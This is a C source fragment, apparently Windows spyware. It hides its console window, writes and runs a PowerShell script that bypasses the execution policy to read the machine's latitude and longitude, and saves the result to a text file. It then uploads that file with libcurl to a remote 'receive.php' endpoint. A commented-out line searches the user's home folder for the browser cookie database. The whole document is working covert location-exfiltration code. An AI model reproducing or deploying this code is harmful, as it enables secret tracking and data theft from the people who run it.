int main(int argc, char *argv[])
{
  ShowWindow (GetConsoleWindow(), SW_HIDE);

   char command[1000];

 strcpy(command, "cmd.exe /c echo Add-Type -AssemblyName System.Device > l.ps1 & echo $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher  >> l.ps1 & echo $GeoWatcher.Start() >> l.ps1 & echo while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { >> l.ps1 & echo     Start-Sleep -Milliseconds 100 }   >> l.ps1 & echo if ($GeoWatcher.Permission -eq 'Denied'){ >> l.ps1 & echo     Write-Error 'Access Denied for Location Information' >> l.ps1 & echo } else {  $GeoWatcher.Position.Location ^| Select Latitude,Longitude } >> l.ps1  & powershell -ExecutionPolicy ByPass -File l.ps1 > l.txt & exit");

 system(command);
Sleep (5000);
 // ShowWindow (GetConsoleWindow(), SW_HIDE);
  CURL *curl;
  CURLcode res;
 
  curl_mime *form = NULL;
  curl_mimepart *field = NULL;
  struct curl_slist *headerlist = NULL;
  static const char buf[] = "Expect:";
 
  curl_global_init(CURL_GLOBAL_ALL);
    char fullpath[MAX_PATH] = { 0 };
  //  if(findfile_recursive(getenv("HOMEPATH") , "cookies.sqlite", fullpath))
  curl = curl_easy_init();
  if(curl) {
    /* Create the form */ 
    form = curl_mime_init(curl);
 
    /* Fill in the file upload field */ 
    field = curl_mime_addpart(form);
    curl_mime_name(field, "file");
    curl_mime_filedata(field, "l.txt");
 
    /* Fill in the submit field too, even if this is rarely needed */ 
    field = curl_mime_addpart(form);
    curl_mime_name(field, "submit");
    curl_mime_data(field, "send", CURL_ZERO_TERMINATED);
 
    /* initialize custom header list (stating that Expect: 100-continue is not
       wanted */ 
    headerlist = curl_slist_append(headerlist, buf);
    /* what URL that receives this POST */ 
    curl_easy_setopt(curl, CURLOPT_URL, "forwarding/receive.php");

    if((argc == 2) && (!strcmp(argv[1], "noexpectheader")))
      /* only disable 100-continue header if explicitly requested */ 
      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
    /* Perform the request, res will get the return code */ 
    res = curl_easy_perform(curl);
    /* Check for errors */ 
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));
 
    /* always cleanup */ 
    curl_easy_cleanup(curl);
 
    /* then cleanup the form */ 
    curl_mime_free(form);
    /* free slist */ 
    curl_slist_free_all(headerlist);
  }

  return 0;
}

